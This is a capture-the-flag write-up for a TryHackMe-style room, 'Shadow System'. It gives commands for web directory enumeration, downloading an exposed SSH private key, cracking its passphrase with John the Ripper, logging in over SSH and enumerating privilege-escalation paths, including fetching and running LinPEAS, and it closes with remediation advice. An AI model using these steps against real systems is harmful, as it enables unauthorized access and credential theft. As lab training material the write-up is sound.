
Markdown
# Shadow System — TryHackMe Write-Up

**Room Name:** Shadow System  
**Difficulty:** Easy / Medium  
**Objective:** Enumerate the exposed web service, locate and retrieve the private SSH key (`id_rsa`), crack the key passphrase offline, establish SSH access as `tom`, escalate privileges on the target host, and read both the `user` and `root` flags.

## Overview

`Shadow System` is a boot-to-root style challenge based on structured enumeration, credential and key discovery, offline passphrase auditing, SSH authentication, and local privilege escalation.

## 1. Reconnaissance & Web Enumeration

### 1.1 Target Reachability

Verify network reachability and inspect the initial HTTP response:

```bash
ping -c 4 <TARGET_IP>
curl -I http://<TARGET_IP>/
curl http://<TARGET_IP>/
Check the returned headers and landing page for server details, hidden links, or other useful information.

1.2 Directory and File Enumeration
Search for hidden directories, backup files, configuration artifacts, and exposed key material:

bash
dirb http://<TARGET_IP>/
You can also use Gobuster to cross-check the results:

bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt -t 40
Manually inspect any interesting directories or files discovered during enumeration.

2. Private Key Discovery
2.1 Retrieve the Private SSH Key
If an exposed private key named id_rsa is discovered, download it to the attacking machine:

bash
wget http://<TARGET_IP>/<PATH_TO_ID_RSA> -O id_rsa
Apply secure permissions and verify the downloaded file:

bash
chmod 600 id_rsa
file id_rsa
head -n 5 id_rsa
A valid private key should remain confidential and must not be shared or stored in a publicly accessible location.

3. Passphrase Cracking & Initial Access
3.1 Extract and Crack the Passphrase
If the private key is encrypted, convert it into a format that John the Ripper can process:

bash
python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
On systems where ssh2john is available directly:

bash
ssh2john id_rsa > id_rsa.hash
Run a dictionary attack using the RockYou wordlist:

bash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
Display the recovered passphrase:

bash
john --show id_rsa.hash
If the RockYou wordlist is compressed, decompress it before use:

bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
Perform passphrase cracking only against systems and keys you are authorized to test.

3.2 SSH Authentication as tom
Use the recovered passphrase and private key to authenticate:

bash
ssh -i id_rsa tom@<TARGET_IP>
Perform basic system inspection after obtaining the shell:

bash
id
whoami
hostname
uname -a
pwd
ls -la
Locate and read the user flag:

bash
find /home -name "user.txt" -type f 2>/dev/null
cat /home/tom/user.txt
4. Privilege Escalation
4.1 Local Enumeration
Inspect the user's privileges and available escalation vectors:

bash
sudo -l
id
uname -a
Search for SUID and SGID binaries:

bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
Search for writable files and directories:

bash
find / -writable -type f 2>/dev/null
find / -writable -type d 2>/dev/null
Review scheduled tasks:

bash
cat /etc/crontab
ls -la /etc/cron*
crontab -l
Inspect running processes:

bash
ps aux
LinPEAS can also be used to perform a broader automated enumeration:

bash
wget <LINPEAS_URL> -O linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
Always review and validate the automated findings manually before attempting exploitation.

4.2 Escalate to Root
Use the identified privilege escalation vector to obtain a root shell.

Confirm elevated privileges:

bash
id
whoami
Verify the root flag:

bash
ls -la /root
cat /root/root.txt
5. Key Takeaways & Remediation
Never expose private keys, backups, credentials, or configuration files in publicly accessible web directories.
Use strong passphrases and store SSH private keys with restricted permissions.
Immediately revoke, rotate, and replace exposed SSH keys.
Review sudo rules, SUID/SGID binaries, cron jobs, writable scripts, and file ownership regularly.
Apply the principle of least privilege to users, services, and administrative access.
Prevent sensitive files from being stored under web roots.
Regularly perform local privilege escalation assessments to identify misconfigurations.
6. Skills Practiced
Web directory and file enumeration
Sensitive data discovery
SSH private key analysis
Offline passphrase cracking
SSH authentication
Linux privilege enumeration
Local privilege escalation
Security remediation
